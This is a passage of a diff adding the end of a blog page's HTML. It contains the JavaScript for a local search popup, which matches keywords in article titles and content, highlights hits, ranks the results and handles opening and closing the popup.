+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
